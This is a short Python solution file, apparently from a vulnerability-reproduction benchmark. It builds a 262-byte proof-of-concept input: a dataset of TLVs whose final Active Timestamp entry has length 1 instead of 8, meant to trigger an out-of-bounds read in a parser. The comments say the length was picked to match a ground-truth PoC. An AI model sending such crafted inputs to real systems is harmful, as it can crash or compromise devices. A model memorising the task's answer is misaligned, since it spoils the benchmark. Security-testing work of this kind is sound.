class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability lies in the missing length validation for specific TLVs,
        # including Active Timestamp (0x0E). The expected value length is 8 bytes,
        # but the code accepts TLVs with shorter lengths. This leads to a stack
        # buffer overflow when the code later attempts to read the full 8 bytes.
        #
        # To trigger this, we construct a dataset of 262 bytes (matching the
        # ground-truth PoC length) to manipulate the memory layout. The PoC is
        # composed of several TLVs, with the malicious one placed at the end.
        # This ensures the out-of-bounds read happens at the edge of a stack buffer.
        #
        # PoC structure:
        # 1. A large TLV (255 bytes) to fill most of the buffer.
        #    Type 0x04 (Network Name), Length 253.
        # 2. A small padding TLV (4 bytes).
        #    Type 0x00 (Channel), Length 2.
        # 3. The vulnerable TLV (3 bytes) at the very end.
        #    Type 0x0E (Active Timestamp), Length 1 (should be 8).
        # Total length: 255 + 4 + 3 = 262 bytes.

        poc = bytearray()

        # TLV 1: Large filler TLV (total size 255 bytes)
        tlv1_type = 0x04  # Network Name
        tlv1_len = 253
        tlv1_val = b'\x00' * tlv1_len
        poc.extend(bytes([tlv1_type, tlv1_len]))
        poc.extend(tlv1_val)

        # TLV 2: Padding TLV (total size 4 bytes)
        tlv2_type = 0x00  # Channel
        tlv2_len = 2
        tlv2_val = b'\x00' * tlv2_len
        poc.extend(bytes([tlv2_type, tlv2_len]))
        poc.extend(tlv2_val)

        # TLV 3: Vulnerable TLV (total size 3 bytes)
        vuln_tlv_type = 0x0E  # Active Timestamp
        vuln_tlv_len = 1      # Incorrect length, should be 8
        vuln_tlv_val = b'\x00'
        poc.extend(bytes([vuln_tlv_type, vuln_tlv_len]))
        poc.extend(vuln_tlv_val)

        return bytes(poc)